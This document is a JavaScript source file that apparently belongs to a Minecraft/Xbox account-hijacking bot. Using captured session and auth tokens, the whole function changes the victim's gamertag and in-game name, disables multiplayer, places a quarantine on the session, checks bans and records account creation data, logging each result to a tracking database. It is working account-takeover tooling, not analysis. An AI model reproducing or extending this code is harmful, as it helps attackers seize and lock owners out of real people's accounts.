const { addquarantine } = require("../../../mainbot/handlers/quarantineutils");
const checkmc = require("../../../db/checkmc");
const { bancheck } = require("../../utils/bancheckappeal/bancheck");
const {
    updateStatus,
    updateExtraInformation,
    logDuration,
    getAcc,
    initializesecure,
    newgamertag,
    generateValidGamertag
} = require("../process/helpers");
const getProfile = require("../minecraft/profile");
const ignNameModifier = require("../minecraft/ignNameModifier");
const changeign = require("../minecraft/changeIgn")
const { disablemultiplayer } = require("../secure/disablemultiplayer");
const { changeGamertag } = require("../info/changexboxgamertag");
const creationdate = require("../secure/creationdate")

const timeTracker = () => {
    const startTime = Date.now();
    return {
        end: (sectionName) => {
            const endTime = Date.now();
            const duration = (endTime - startTime) / 1000;
            console.log(`Section "${sectionName}" completed in ${duration.toFixed(2)} seconds`);
            return duration;
        }
    };
};

module.exports = async function mcextra(axios, usertoken, xuid, gtg, settings, userid, uid, msauth, ssid, mc, oldname, optionalusername = null, username = null, mxbl) {
    const mcextra = { ban: null, banReason: null, newign: oldname, banchecked: false };
    const promises = [];

    if (ssid && settings.autoquarantine && checkmc(mc)) {
        promises.push(
            (async () => {
                const delay = 15000;
                await addquarantine(userid, ssid, false, delay, "Automatically added quarantine!");
            })()
        );
    }

    promises.push(
        (async () => {
            let newgamertagd = { success: false, reason: `Failed error 1` };

            if (!usertoken) {
                newgamertagd = { success: false, reason: `Failed to get token (1A).` };
            } else {
                let newgtg = null;

                if (settings.changegamertag) {
                    if (gtg) {
                        newgtg = await newgamertag(gtg);
                        console.log(`Generated ${newgtg} from ${gtg}`)
                    } else {
                        newgtg = generateValidGamertag();
                        console.log(`Generated: ${newgtg}`)
                    }
                    console.log(`New gamertag: ${newgtg}`);
                    newgamertagd = await changeGamertag(usertoken, newgtg);
                } else {
                    newgamertagd = { success: false, reason: `Changing is disabled.` };
                }
            }

            await updateExtraInformation(uid, 'newgamertag', JSON.stringify(newgamertagd));
        })()
    );

    if (settings.checkban && ssid && checkmc(mc)) {
        promises.push(
            (async () => {
                try {
                    const ban = await bancheck(ssid);
                                    
                mcextra.banchecked = true;
                mcextra.ban = ban.ban;
                mcextra.banReason = ban.banReason;
                console.log(ban);
                } catch (err){
                }

            })()
        );
    }

    if (settings.multiplayer && mxbl) {
        promises.push(
            (async () => {
                console.log('Disabling Multiplayer!');
                const result = await disablemultiplayer(mxbl);
                if (result) {
                    console.log('Disabled Multiplayer!');
                    await updateStatus(uid, "multiplayer", 'Turned off');
                    await updateExtraInformation(uid, "multiplayer", 'Turned off');
                } else {
                    await updateStatus(uid, "multiplayer", 'Failed (likely due to family)');
                    await updateExtraInformation(uid, "multiplayer", 'Failed (likely due to family)');
                }
            })()
        );
    } else {
        await updateStatus(uid, "multiplayer", 'Option is disabled.');
        await updateExtraInformation(uid, "multiplayer", 'Option is disabled.');
    }

    if (optionalusername && ssid && oldname && username && checkmc(mc)) {
        promises.push(
            (async () => {
                const changed = await changeign(ssid, username);
                if (changed) {
                    await updateExtraInformation(uid, "changedusername", "true");
                    mcextra.newign = username;
                    await updateStatus(uid, "username", username);
                } else {
                    await updateExtraInformation(uid, "changedusername", "false");
                    mcextra.newign = oldname;
                    await updateStatus(uid, "username", oldname + " (Couldn't change)");
                }
            })()
        );
    }

    if (settings.change_ign && !optionalusername && ssid && oldname && checkmc(mc)) {
        promises.push(
            (async () => {
                console.log('Changing name...');
                const newName = await ignNameModifier(oldname);
                console.log(`Generated new name: ${newName}`);
                const changed = await changeign(ssid, newName);
                if (changed) {
                    mcextra.newign = newName;
                    await updateStatus(uid, "username", newName);
                    await updateExtraInformation(uid, "changedusername", "true");
                } else {
                    await updateExtraInformation(uid, "changedusername", "false");
                    mcextra.newign = oldname;
                    await updateStatus(uid, "username", oldname + " (Couldn't change)");
                }
            })()
        );
    }

    if (ssid && oldname && checkmc(mc)) {
        promises.push(
            (async () => {
                let datecreated = await creationdate(ssid);
                if (Object.keys(datecreated).length > 0) {
                    await updateExtraInformation(uid, "creationdate", datecreated?.created);
                    await updateExtraInformation(uid, "namechange", datecreated?.allowed);
                }
            })()
        );
    }

    const tracker = timeTracker();
    await Promise.all(promises);
    tracker.end("All MC Extra Tasks");

    return mcextra;
};
